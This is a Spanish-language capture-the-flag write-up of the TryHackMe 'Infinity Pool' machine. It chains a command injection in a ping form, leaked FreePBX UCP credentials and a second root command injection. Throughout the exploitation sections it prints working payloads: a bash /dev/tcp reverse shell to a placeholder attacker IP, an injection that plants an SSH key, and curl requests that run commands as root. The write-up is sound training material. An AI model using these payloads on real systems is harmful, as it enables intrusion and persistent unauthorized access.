---
title: "Infinity Pool"
date: 2026-08-06 05:30:00 -0400
description: "Boot2Root de TryHackMe donde una inyección de comandos en un formulario de 'ping' escala hasta root explotando una CVE real de FreePBX (credenciales de plantilla hardcodeadas) y una segunda inyección de comandos en una API interna."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [command-injection, freepbx, cve-2026-46376, privilege-escalation, boot2root, medium]
---

> ## 📌 Ficha Técnica
>
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays 2026 — Infinity Pool
> - **Dificultad:** Media
> - **Categoría:** Boot2Root / Web
> - **Técnicas Clave:** Enumeración vía `robots.txt`, OS Command Injection, pivote de reverse shell a acceso SSH persistente, enumeración de servicios internos multi-usuario, explotación de CVE-2026-46376 (FreePBX UCP), abuso de API interna autenticada por Bearer token con segunda inyección de comandos.
{: .prompt-info }

## Introducción

**Infinity Pool** es una máquina Boot2Root del evento *Hacker Holidays 2026* de TryHackMe. La premisa narrativa: el hotel ficticio *Byte Lotus* promete una experiencia "impulsada por tecnología moderna, de vigilancia total" — y, como suele pasar en este tipo de retos, esa infraestructura interna esconde bastante más de lo que un huésped (o un pentester externo) debería poder alcanzar.

La cadena completa de explotación combina una inyección de comandos clásica en un formulario de "ping" con el abuso de una vulnerabilidad real y documentada de FreePBX (**CVE-2026-46376**), cerrando con una segunda inyección de comandos en una API interna que corre como `root`.

## Reconocimiento

Un escaneo completo de puertos con `nmap` solo reveló dos servicios expuestos:

```bash
nmap -sC -sV -p- 10.66.134.218
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    gunicorn
```

El fingerprint HTTP ya deja ver el tema de la máquina: el título de la página es *"Byte Lotus — Stay Noticed"*, con un fuerte tono de "hotel de vigilancia de lujo".

Al visitar la web principal, se ve una landing normal de hotel con un botón de reserva deshabilitado — nada explotable a primera vista. El siguiente paso natural es revisar el código fuente y los recursos estáticos en busca de rutas o comentarios olvidados.

### Enumeración de rutas ocultas

`robots.txt` resultó ser el hilo del que tirar:

```
User-agent: *
Disallow: /internal/
Disallow: /status
```

Un archivo que le dice a los buscadores exactamente qué **no** indexar es, para un atacante, prácticamente un índice de contenido interesante.

Revisando también `/static/app.js`, apareció un comentario de desarrollo dejado sin querer en producción:

```javascript
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships.
```

Esto confirma que `/status` es una herramienta interna de staff, y que envía sus datos por POST a `/internal/netcheck`.

Comentarios de desarrollo, archivos `.js.map`, y `robots.txt` son de las primeras cosas a revisar en cualquier reconocimiento web — muchas veces el propio desarrollador documenta accidentalmente el camino de ataque.
{: .prompt-tip }

## Explotación

### Inyección de comandos en el "ping" interno

`/status` expone una herramienta llamada *"Sister-property connectivity"*: un campo de texto donde, supuestamente, el staff verifica si una propiedad hermana del hotel responde antes de enrutar la transferencia de un huésped.

El formulario envía un parámetro `host` por POST a `/internal/netcheck`. Ante cualquier campo que internamente ejecuta un `ping`, el primer test obligatorio es probar separadores de shell:

```
;ls
```

La respuesta devolvió el listado de archivos del servidor — confirmando una **inyección de comandos sin sanitizar**.

```console
web@tryhackme-2404:~$ ;whoami
web
web@tryhackme-2404:~$ ;cat /home/web/user.txt
THM{n0_v1s1bl3_3dg3}
```

**User flag obtenida:** `THM{n0_v1s1bl3_3dg3}`

Más adelante, leyendo el propio código fuente de la aplicación (accesible también vía la misma inyección), se confirmó la causa raíz:

```python
@app.route("/internal/netcheck", methods=["POST"])
def netcheck():
    host = request.form.get("host", "").strip()
    proc = subprocess.run(
        f"ping -c 1 {host}",
        shell=True,
        capture_output=True,
        text=True,
        timeout=15,
    )
```

`shell=True` combinado con un `f-string` sin ningún tipo de *allowlist* o *escaping* es la receta clásica del OS Command Injection. La app corre bajo `gunicorn` como el usuario de bajo privilegio `web`.

### De la inyección a una shell estable

Trabajar comando por comando a través de un campo de formulario es lento. El siguiente paso es una reverse shell:

```bash
# Listener en la máquina atacante
nc -lvnp 4444
```

```
;bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'
```

Y estabilizando con un PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Esta shell es suficiente para enumerar, pero tiene una limitación importante: no permite hacer *port forwarding* SSH para alcanzar servicios internos desde un navegador. La solución fue inyectar una clave pública propia usando el mismo vector de inyección:

```bash
# En la máquina atacante
ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""
base64 -w0 ctf_key.pub
```

Y a través del campo `host` de `/internal/netcheck`:

```
127.0.0.1;mkdir -p /home/web/.ssh;echo <PUBKEY_BASE64> | base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```

Con esto, acceso SSH limpio y persistente:

```bash
ssh -o IdentitiesOnly=yes -i ctf_key web@10.66.134.218
```

En cuanto se detecte que hay servicios internos accesibles solo por loopback, conviene priorizar el pivote a SSH sobre seguir automatizando todo por `curl` desde una reverse shell inestable. Ahorra mucho tiempo de depuración.
{: .prompt-tip }

## Escalada de Privilegios

### Enumeración: tres apps, tres usuarios

`sudo -l` pide contraseña y no hay binarios SUID poco comunes ni capabilities relevantes. Lo interesante apareció en el listado de procesos:

```console
web@tryhackme-2404:~$ ps aux | grep gunicorn
root     664  .../automation/venv/bin/gunicorn --bind 127.0.0.1:9000 wsgi:app
web      665  .../edge/venv/bin/gunicorn --bind 0.0.0.0:80 wsgi:app
svc-wat+ 666  .../watchtower/venv/bin/gunicorn --bind 127.0.0.1:3000 wsgi:app
```

Tres aplicaciones Flask/gunicorn conviviendo bajo `/var/www/infinity_pool/`, cada una arrancada como `root` pero delegando el *worker* a un usuario distinto:

| App | Puerto | Usuario del worker |
|---|---|---|
| `edge` | 80 (público) | `web` |
| `watchtower` | 3000 (loopback) | `svc-watch` |
| `automation` | 9000 (loopback) | **`root`** |

Ese patrón — master de gunicorn como root, worker con privilegios reducidos — descarta cualquier atajo de permisos de archivo. Hay que encontrar una vulnerabilidad de aplicación en alguno de los dos servicios internos.

`watchtower` (puerto 3000) fue el más fácil de tantear sin autenticación:

```bash
curl -s http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Un secreto operativo de "hay que rotar esto" que nunca se rotó, filtrado en un endpoint de configuración sin autenticación.

En paralelo, `ss -tlnp` mostró más servicios internos, incluyendo un **FreePBX/Asterisk** completo en el puerto 8080 (`/ucp`) y AMI en 5038, coherente con el proceso `asterisk` visto en `ps aux`.

### CVE-2026-46376: credenciales de plantilla de FreePBX UCP

Antes de probar credenciales a ciegas, conviene confirmar versiones y buscar CVEs conocidas:

```bash
grep -i version /var/www/html/admin/modules/ucp/module.xml
grep -i version /var/www/html/admin/modules/userman/module.xml
```

```
ucp:     16.0.39
userman: 16.0.44
```

Esa combinación cae dentro del rango afectado por **[CVE-2026-46376](https://nvd.nist.gov/vuln/detail/CVE-2026-46376)**: instalaciones de FreePBX que usaron el proceso de plantillas genéricas de UCP quedan con credenciales de ejemplo hardcodeadas (`FreePBXUCPTemplateCreator`), que permiten acceso no autenticado si el administrador no las rota manualmente tras la configuración inicial. El advisory oficial ([GHSA-m55x-h47x-v3gx](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m55x-h47x-v3gx)) confirma exactamente este comportamiento.

Confirmar la CVE exacta antes de "solo probar" credenciales no es un paso opcional: valida que el vector es correcto y explica *por qué* existe la vulnerabilidad, lo que ayuda a reconocer el mismo patrón más rápido en otra máquina.
{: .prompt-tip }

Todo esto ocurre en un puerto que solo escucha en loopback (8080). Para llevarlo a un navegador real, se monta un túnel SSH aprovechando el acceso persistente ya obtenido:

```bash
ssh -o IdentitiesOnly=yes -i ctf_key -L 8080:127.0.0.1:8080 web@10.66.134.218
```

Con `http://127.0.0.1:8080/ucp` abierto localmente, login con:

```
Usuario:    FreePBXUCPTemplateCreator
Contraseña: St4yN0t1c3d_2026
```

El formulario de login de UCP no usa un nombre de token CSRF estándar, sino un campo `<input type="hidden" name="token">` regenerado en cada `GET` a `?display=login`, atado a la cookie de sesión de esa misma petición. Reutilizar un token capturado en otra petición falla silenciosamente devolviendo el mismo formulario — si se automatiza por `curl`, hay que capturar cookies y token en la misma cadena de peticiones.
{: .prompt-warning }

### El token escondido en el buzón de voz

Dentro del dashboard de UCP, en la sección **Voicemail**, apareció un token:

```
cc_auto_7b3f9a1c4e0d2f6a
```

Este dato no es descubrible por enumeración automatizada: solo aparece navegando la interfaz real del panel, lo que refuerza la importancia de combinar automatización con exploración manual cuando hay una UI rica de por medio.

### Segunda inyección de comandos: la API de `automation`

`watchtower` ya había revelado que `automation_endpoint` apunta a `http://127.0.0.1:9000` — el servicio que corre como `root`. Con el token del buzón de voz como `Bearer`, se puede interactuar con su API:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest"}'
```

```json
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1", "output":"..."}
```

La propia respuesta expone el comando shell construido a partir del campo `"report"` sin sanitizar — el mismo patrón de vulnerabilidad visto en `/internal/netcheck`, pero esta vez en un endpoint con privilegios de `root`. Confirmando con `id`:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;id;#"}'
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Y finalmente, leyendo la flag de root:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;cat /root/root.txt;#"}'
```

```
THM{tr4c3d_t0_th3_h0r1z0n}
```

**Root flag obtenida:** `THM{tr4c3d_t0_th3_h0r1z0n}`

## Resumen de la Cadena de Ataque

1. `robots.txt` revela las rutas `/status` y `/internal/`.
2. Inyección de comandos en `/internal/netcheck` (parámetro `host`) → shell como `web`.
3. User flag en `/home/web/user.txt`.
4. Enumeración de procesos revela tres apps Flask internas (`edge`, `watchtower`, `automation`), la última corriendo como `root`.
5. `watchtower` expone en `/api/config` credenciales sin rotar de FreePBX UCP.
6. Las credenciales corresponden a **CVE-2026-46376** (plantillas UCP con credenciales hardcodeadas).
7. Túnel SSH (tras inyectar una clave propia) + login en UCP → token Bearer filtrado en la sección Voicemail.
8. Ese token autentica contra la API interna de `automation` (puerto 9000, root) → segunda inyección de comandos.
9. Root flag en `/root/root.txt`.

## Conclusión / Retroalimentación

**Infinity Pool** es un buen ejercicio de encadenamiento: ninguno de los pasos individuales es extremadamente difícil, pero la máquina obliga a mantener el hilo entre hallazgos dispersos — un secreto filtrado en una API, una versión de software que hay que cruzar contra una CVE real, y un token que solo aparece explorando manualmente una interfaz de administración.

Los aprendizajes clave que me llevo:

- **`robots.txt` y comentarios de desarrollo siguen siendo, en 2026, una fuente de reconocimiento sorprendentemente efectiva.** Vale la pena revisarlos sistemáticamente antes de pasar a fuzzing más agresivo.
- **`shell=True` con interpolación de strings es una de las vulnerabilidades más consistentes en aplicaciones Flask/Python mal escritas**, y apareció dos veces en esta máquina (en `/internal/netcheck` y en `/jobs/export`), lo cual refuerza lo común que es este antipatrón en código de automatización interno.
- **Pivotar de una reverse shell frágil a acceso SSH persistente cuanto antes** ahorra mucho tiempo, especialmente en máquinas donde hay servicios internos que conviene explorar desde un navegador real (paneles de administración, dashboards) en vez de pelear con `curl` a ciegas.
- **Verificar versiones exactas de software y cruzarlas contra el NVD o advisories oficiales** (en este caso, CVE-2026-46376 en FreePBX) transforma un ataque de "credenciales por defecto que probé por suerte" en uno fundamentado, y da contexto sobre por qué la vulnerabilidad existe.
- **No todo se puede automatizar sin explorar manualmente.** El token final estaba en un buzón de voz dentro de un panel de FreePBX — ningún script de enumeración lo hubiera encontrado sin saber de antemano dónde mirar.

En general, una sala muy recomendable para practicar reconocimiento metódico, inyección de comandos, y el hábito de correlacionar hallazgos de configuración con vulnerabilidades reales y documentadas.
